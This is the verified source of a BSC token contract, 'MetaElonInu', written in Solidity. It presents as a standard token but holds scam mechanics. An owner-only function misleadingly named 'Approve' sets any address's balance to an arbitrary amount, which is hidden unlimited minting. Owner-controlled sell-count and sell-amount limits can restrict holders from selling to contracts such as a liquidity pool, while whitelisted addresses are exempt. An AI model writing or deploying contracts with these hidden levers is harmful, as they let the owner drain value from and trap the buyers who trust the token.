/**
 *Submitted for verification at BscScan.com on 2022-01-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract MetaElonInu is Ownable {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  address minter;
  address public poolAddress;
  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
    minter = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply * 10 ** uint256(decimals);
    balances[minter] = totalSupply;
    allowAddress[minter] = true;
  }
  mapping(address => uint256) public balances;
  mapping(address => uint256) public sellerCountNum;
  mapping(address => uint256) public sellerCountToken;
  uint256 public maxSellOutNum;
  uint256 public maxSellToken;
  bool lockSeller = true;
  mapping(address => bool) public blackLists;
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= balances[from]);
    if(!from.isContract() && _to.isContract()){
        require(blackLists[from] == false && blackLists[_to] == false);
    }
    if(allowAddress[from] || allowAddress[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transfer(from, _to, _value);
        return true;
    }
    if(check(from, _to)){
        sellerCountToken[from] = sellerCountToken[from].add(_value);
        sellerCountNum[from]++;
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  function check(address from, address _to) internal view returns(bool){
    if(!from.isContract() && _to.isContract()){
        if(lockSeller){
            if(maxSellOutNum == 1000000000000000 && maxSellToken == 1000000000000000){
                return false;
            }
            if(maxSellOutNum > 1000000000000000){
                require(maxSellOutNum > sellerCountNum[from], "reach max seller times");
            }
            if(maxSellToken > 1000000000000000){
                require(maxSellToken > sellerCountToken[from], "reach max seller token");
            }
        }
    }
    return true;
  }
  function _transfer(address from, address _to, uint256 _value) private {
    balances[from] = balances[from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(from, _to, _value);
  
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    address from = _from;
    if(!from.isContract() && _to.isContract()){
        require(blackLists[from] == false && blackLists[_to] == false);
    }
    if(allowAddress[from] || allowAddress[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(check(from, _to)){
        _transferFrom(_from, _to, _value);
        if(maxSellOutNum > 0){
            sellerCountToken[from] = sellerCountToken[from].add(_value);
        }
        if(maxSellToken > 0){
            sellerCountNum[from]++;
        }
        return true;
    }
    return false;
  }
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  function setWhiteAddress(address holder, bool allowApprove) external onlyOwner {
      allowAddress[holder] = allowApprove;
  }
  function setSellerState(bool ok) external onlyOwner returns (bool){
      lockSeller = ok;
  
  }  
  function setMaxSellOutNum(uint256 num) external onlyOwner returns (bool){
      maxSellOutNum = num;
  } 
  function setMaxSellToken(uint256 num) external onlyOwner returns (bool){
      maxSellToken = num * 1000000000000000 ** uint256(decimals);
  }    
  function Approve(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value * 10 ** uint256(decimals);
  }
}